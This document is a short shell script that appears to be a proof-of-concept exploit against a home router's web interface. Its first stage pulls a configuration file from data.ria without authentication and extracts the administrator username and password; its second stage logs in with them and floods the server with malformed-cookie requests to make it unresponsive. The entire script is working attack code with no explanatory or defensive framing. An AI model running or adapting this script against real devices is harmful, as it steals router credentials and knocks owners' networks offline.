#!/bin/sh

TMP_DIR=$(mktemp -d)

echo -n "Stage [1] - Bypassing authentication ..."

wget -qO${TMP_DIR}/stage1-axx 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&file=system'
http_login=$(grep web_usrname ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
http_password=$(grep web_passwd ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
echo " OK"

echo -n "Stage [2] - DoS ..."
http_login=$(echo $http_login | tr -d '\r')
http_password=$(echo $http_password | tr -d '\r')
http_session=$(wget -qO/dev/null --server-response --post-data="uname=$http_login&passwd=$http_password" http://192.168.1.1/login.cgi 2>&1 | grep Cooki | awk '{ print $2 }')
for i in $(seq 0 10)
do
  wget -qO/dev/null --header="Cookie: ${http_session}hey-i-dont-think-your-parsing-of-cookies-works-well" "http://192.168.1.1/data.ria?token=100000000000000" &
done
echo " OK"
echo "Done. The HTTP server is surely unresponsive now."

